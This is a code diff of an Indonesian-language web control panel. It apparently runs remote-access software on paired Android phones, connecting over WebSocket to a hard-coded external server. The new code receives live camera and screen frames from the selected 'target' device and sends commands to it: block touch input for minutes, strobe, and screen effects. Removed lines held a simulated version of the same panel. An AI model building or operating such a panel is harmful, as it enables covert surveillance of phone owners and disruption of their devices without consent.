+Aktifkan Fitur
+<small>Status: <span id="strobeStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="strobeToggle" onchange="updateStatus('strobeStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="form-group">
 <label>Kecepatan (ms)</label>
 <input type="number" id="strobeSpeed" value="100" min="10" max="2000">
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="strobeToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('STROBE', {speed: document.getElementById('strobeSpeed').value, active: document.getElementById('strobeToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalStrobe')">TUTUP</button>
-</div>
-</div>
 </div>
 
-<!-- MODAL SCREEN -->
-<div class="modal" id="modalScreen">
-<div class="modal-content">
+<button class="btn" style="width:100%;" onclick="sendCmd('STROBE', {speed: document.getElementById('strobeSpeed').value, active: document.getElementById('strobeToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: SCREEN -->
+<!-- ============================================ -->
+<div id="page-screen" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="2" y="3" width="20" height="14" rx="2"/>
+<line x1="8" y1="21" x2="16" y2="21"/>
+</svg>
 <h2>LIVE SCREEN</h2>
-<div class="screen-view" id="screenView">[ SCREEN FEED OFFLINE ]</div>
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="screenToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('SCREEN', {active: document.getElementById('screenToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalScreen')">TUTUP</button>
 </div>
-</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
 </div>
 
-<!-- MODAL BLOCK TOUCH -->
-<div class="modal" id="modalBlockTouch">
-<div class="modal-content">
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="screenStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="screenToggle" onchange="updateStatus('screenStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="screen-view" id="screenView">
+<div class="placeholder">[ SCREEN OFFLINE ]</div>
+<img id="screenFrame" alt="screen">
+</div>
+
+<button class="btn" style="width:100%;" onclick="sendCmd('SCREEN', {active: document.getElementById('screenToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: BLOCK TOUCH -->
+<!-- ============================================ -->
+<div id="page-blocktouch" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<path d="M18 11V6a2 2 0 0 0-4 0v5"/>
+<path d="M14 10V4a2 2 0 0 0-4 0v6"/>
+<path d="M10 10.5V6a2 2 0 0 0-4 0v8"/>
+</svg>
 <h2>BLOCK TOUCH</h2>
+</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="blockStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="blockToggle" onchange="updateStatus('blockStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="form-group">
 <label>Durasi (menit)</label>
 <input type="number" id="blockDuration" value="5" min="1" max="60">
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="blockToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('BLOCK_TOUCH', {duration: document.getElementById('blockDuration').value, active: document.getElementById('blockToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalBlockTouch')">TUTUP</button>
-</div>
-</div>
 </div>
 
-<!-- MODAL LCD -->
-<div class="modal" id="modalLcd">
-<div class="modal-content">
+<button class="btn" style="width:100%;" onclick="sendCmd('BLOCK_TOUCH', {duration: document.getElementById('blockDuration').value, active: document.getElementById('blockToggle').checked})">KIRIM COMMAND</button>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGE: LCD -->
+<!-- ============================================ -->
+<div id="page-lcd" class="hidden">
+<div class="page-header">
+<div class="page-title">
+<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+<rect x="2" y="3" width="20" height="14" rx="2"/>
+<line x1="2" y1="8" x2="22" y2="8"/>
+<line x1="2" y1="12" x2="22" y2="12"/>
+</svg>
 <h2>LCD EFFECT</h2>
+</div>
+<button class="back-btn" onclick="showPage('dashboard')">
+<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
+<path d="M19 12H5M12 19l-7-7 7-7"/>
+</svg>
+</button>
+</div>
+
+<div class="toggle-row">
+<div class="toggle-label">
+Aktifkan Fitur
+<small>Status: <span id="lcdStatus">OFF</span></small>
+</div>
+<label class="switch">
+<input type="checkbox" id="lcdToggle" onchange="updateStatus('lcdStatus', this.checked)">
+<span class="slider-sw"></span>
+</label>
+</div>
+
+<div class="form-group">
 <label>Warna Efek</label>
 <select id="lcdColor">
 <option value="green">Hijau</option>
@@ -336,126 +708,275 @@ input:checked + .slider:before { transform:translateX(24px); }
 <option value="blue">Biru</option>
 <option value="red">Merah</option>
 </select>
-<label>Aktifkan Fitur</label>
-<label class="toggle"><input type="checkbox" id="lcdToggle"><span class="slider"></span></label>
-<div class="modal-actions">
-<button class="btn" onclick="sendCommand('LCD_EFFECT', {color: document.getElementById('lcdColor').value, active: document.getElementById('lcdToggle').checked})">KIRIM</button>
-<button class="btn btn-danger" onclick="closeModal('modalLcd')">TUTUP</button>
 </div>
+
+<button class="btn" style="width:100%;" onclick="sendCmd('LCD_EFFECT', {color: document.getElementById('lcdColor').value, active: document.getElementById('lcdToggle').checked})">KIRIM COMMAND</button>
 </div>
+
 </div>
+
+<div id="toast">Command terkirim!</div>
 
 <script>
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const SERVER_HOST = 'lyx-server-production-38a0.up.railway.app';
+const WS_PANEL_URL = 'wss://' + SERVER_HOST + '/panel';
+const API_URL = 'https://' + SERVER_HOST + '/api';
+
+/* ============================================================
+   STATE
+   ============================================================ */
 let devices = [];
 let currentDevice = null;
-let wsConnection = null;
+let ws = null;
 
-// Generate pairing code
-function generateCode() {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-    let code = '';
-    for(let i=0; i<12; i++) {
-        if(i>0 && i%4===0) code += ' ';
-        code += chars.charAt(Math.floor(Math.random()*chars.length));
+/* ============================================================
+   PAGE NAVIGATION
+   ============================================================ */
+function showPage(page) {
+    document.querySelectorAll('[id^="page-"]').forEach(p => p.classList.add('hidden'));
+    const target = document.getElementById('page-' + page);
+    if(target) target.classList.remove('hidden');
+    window.scrollTo({top:0, behavior:'smooth'});
+}
+
+function updateStatus(elId, checked) {
+    const el = document.getElementById(elId);
+    if(el) {
+        el.textContent = checked ? 'ON' : 'OFF';
+        el.style.color = checked ? '#0f0' : '#f00';
     }
-    document.getElementById('pairingCode').textContent = code;
-    // Simulasi: setelah generate, device target muncul setelah 3 detik
-    setTimeout(() => {
-        addDevice(code.replace(/\s/g,''));
-    }, 3000);
 }
 
-function copyCode() {
-    const code = document.getElementById('pairingCode').textContent;
-    navigator.clipboard.writeText(code.replace(/\s/g,''));
-    alert('Pairing code copied: ' + code.replace(/\s/g,''));
+/* ============================================================
+   CONNECT WS
+   ============================================================ */
+function connectWS() {
+    try {
+        ws = new WebSocket(WS_PANEL_URL);
+        
+        ws.onopen = () => {
+            console.log('[PANEL] Connected');
+            document.getElementById('connStatus').textContent = 'ONLINE';
+            document.getElementById('connStatus').style.color = '#0f0';
+        };
+        
+        ws.onmessage = (event) => {
+            try {
+                const data = JSON.parse(event.data);
+                handleWSMessage(data);
+            } catch(e) { console.log('Parse error:', e); }
+        };
+        
+        ws.onclose = () => {
+            console.log('[PANEL] Disconnected, retry...');
+            document.getElementById('connStatus').textContent = 'RECONNECTING';
+            document.getElementById('connStatus').style.color = '#ff0';
+            setTimeout(connectWS, 3000);
+        };
+        
+        ws.onerror = (e) => {
+            console.log('[PANEL] Error:', e.message);
+        };
+    } catch(e) {
+        console.log('WS error:', e.message);
+        setTimeout(connectWS, 3000);
+    }
 }
 
-function addDevice(code) {
-    const id = 'DEV-' + Math.random().toString(36).substring(2,8).toUpperCase();
-    const device = {
-        id: id,
-        name: 'Android Device ' + (devices.length+1),
-        status: 'online',
-        code: code,
-        ip: '192.168.1.' + Math.floor(Math.random()*255),
-        lastSeen: new Date().toLocaleTimeString()
-    };
-    devices.push(device);
-    renderDevices();
+function handleWSMessage(data) {
+    switch(data.type) {
+        case 'device_list':
+            devices = data.devices || [];
+            renderDevices();
+            break;
+        case 'device_paired':
+            addDeviceToList({
+                deviceId: data.deviceId,
+                info: data.info,
+                online: true,
+                lastSeen: Date.now()
+            });
+            toast('Device baru terpairing!');
+            break;
+        case 'device_online':
+            updateDeviceStatus(data.deviceId, true);
+            break;
+        case 'device_offline':
+            updateDeviceStatus(data.deviceId, false);
+            break;
+        case 'cam_frame':
+            if(currentDevice && currentDevice.deviceId === data.deviceId) {
+                const img = document.getElementById('camFrame');
+                img.src = data.frame;
+                document.getElementById('camView').classList.add('live');
+            }
+            break;
+        case 'screen_frame':
+            if(currentDevice && currentDevice.deviceId === data.deviceId) {
+                const img = document.getElementById('screenFrame');
+                img.src = data.frame;
+                document.getElementById('screenView').classList.add('live');
+            }
+            break;
+        case 'ack':
+            console.log('ACK:', data.command);
+            break;
+        case 'code_generated':
+            document.getElementById('pairingCode').textContent = formatCode(data.code);
+            break;
+    }
 }
 
+/* ============================================================
+   DEVICE LIST
+   ============================================================ */
 function renderDevices() {
     const list = document.getElementById('deviceList');
     if(devices.length === 0) {
-        list.innerHTML = '<p style="color:#080;font-size:0.9em;">Belum ada device terpairing...</p>';
+        list.innerHTML = '<p style="color:#080;font-size:0.85em;text-align:center;padding:20px;">Belum ada device terpairing...</p>';
         return;
     }
-    list.innerHTML = devices.map((d,i) => `
+    list.innerHTML = devices.map((d, i) => `
         <div class="device-item">
             <div class="device-info">
                 <div class="device-icon">
-                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
                         <rect x="5" y="2" width="14" height="20" rx="2"/>
                         <line x1="12" y1="18" x2="12" y2="18"/>
                     </svg>
                 </div>
                 <div>
-                    <div class="device-name">${d.name}</div>
-                    <div class="device-status">
-                        <span class="${d.status}">${d.status.toUpperCase()}</span> | 
-                        ${d.ip} | ${d.id}
+                    <div class="device-name">${escapeHtml(d.deviceId)}</div>
+                    <div class="device-meta">
+                        <span class="${d.online ? 'online' : 'offline'}">${d.online ? '● ONLINE' : '○ OFFLINE'}</span>
+                        ${d.info && d.info.platform ? ' | ' + escapeHtml(d.info.platform) : ''}
                     </div>
                 </div>
             </div>
-            <div style="display:flex;gap:8px;">
-                <button class="btn" onclick="openDashboard(${i})">OPEN</button>
-                <button class="btn btn-danger" onclick="removeDevice(${i})">HAPUS</button>
+            <div class="device-actions">
+                <button class="btn" onclick="openDevice(${i})">OPEN</button>
+                <button class="btn btn-red" onclick="removeDevice(${i})">HAPUS</button>
             </div>
         </div>
     `).join('');
 }
 
+function addDeviceToList(d) {
+    const exists = devices.find(x => x.deviceId === d.deviceId);
+    if(!exists) {
+        devices.push(d);
+        renderDevices();
+    }
+}
+
+function updateDeviceStatus(deviceId, online) {
+    const d = devices.find(x => x.deviceId === deviceId);
+    if(d) {
+        d.online = online;
+        renderDevices();
+    }
+}
+
 function removeDevice(index) {
-    devices.splice(index,1);
+    devices.splice(index, 1);
     renderDevices();
+    toast('Device dihapus');
 }
 
-function openDashboard(index) {
+function openDevice(index) {
     currentDevice = devices[index];
-    document.getElementById('dashDeviceName').textContent = currentDevice.name + ' [' + currentDevice.id + ']';
-    document.getElementById('dashboard').classList.add('active');
-    window.scrollTo({top:0, behavior:'smooth'});
+    document.getElementById('dashTitle').textContent = currentDevice.deviceId;
+    showPage('dashboard');
 }
 
-function openModal(id) {
-    document.getElementById(id).classList.add('active');
+/* ============================================================
+   PAIRING
+   ============================================================ */
+function generateCode() {
+    if(ws && ws.readyState === 1) {
+        ws.send(JSON.stringify({ type: 'generate_code' }));
+    } else {
+        // fallback via REST
+        fetch(API_URL + '/generate', { method: 'POST' })
+            .then(r => r.json())
+            .then(d => {
+                if(d.success) {
+                    document.getElementById('pairingCode').textContent = formatCode(d.code);
+                    toast('Code generated!');
+                }
+            })
+            .catch(e => toast('Gagal generate code', true));
+    }
 }
 
-function closeModal(id) {
-    document.getElementById(id).classList.remove('active');
+function formatCode(code) {
+    if(!code) return '---- ---- ----';
+    return code.match(/.{1,4}/g).join(' ');
 }
 
-function sendCommand(cmd, params) {
-    const payload = {
-        deviceId: currentDevice ? currentDevice.id : null,
+function copyCode() {
+    const code = document.getElementById('pairingCode').textContent.replace(/\s/g,'');
+    if(code === '------------------------' || code.length < 12) {
+        toast('Generate code dulu!', true);
+        return;
+    }
+    navigator.clipboard.writeText(code).then(() => {
+        toast('Code disalin: ' + code);
+    }).catch(() => {
+        toast('Gagal copy', true);
+    });
+}
+
+/* ============================================================
+   SEND COMMAND
+   ============================================================ */
+function sendCmd(cmd, params) {
+    if(!currentDevice) {
+        toast('Pilih device dulu!', true);
+        return;
+    }
+    
+    if(!ws || ws.readyState !== 1) {
+        toast('Server offline!', true);
+        return;
+    }
+    
+    ws.send(JSON.stringify({
+        type: 'command',
+        deviceId: currentDevice.deviceId,
         command: cmd,
-        params: params,
-        timestamp: new Date().toISOString()
-    };
+        params: params
+    }));
     
-    // Kirim ke pairing code target via WebSocket / API
-    fetch('/api/command', {
-        method: 'POST',
-        headers: {'Content-Type':'application/json'},
-        body: JSON.stringify(payload)
-    }).then(r => r.json())
-      .then(data => console.log('Command sent:', data))
-      .catch(e => console.log('Command queued:', payload));
-    
-    console.log('>>> COMMAND SENT:', payload);
-    alert('Command ' + cmd + ' terkirim ke ' + (currentDevice ? currentDevice.name : 'target'));
+    toast('Command ' + cmd + ' terkirim!');
 }
+
+/* ============================================================
+   UTILS
+   ============================================================ */
+function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, c => ({
+        '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+    }[c]));
+}
+
+let toastTimer;
+function toast(msg, isError) {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = isError ? 'show error' : 'show';
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => { t.className = ''; }, 2500);
+}
+
+/* ============================================================
+   INIT
+   ============================================================ */
+connectWS();
+document.addEventListener('contextmenu', e => e.preventDefault());
 </script>
 
 </body>
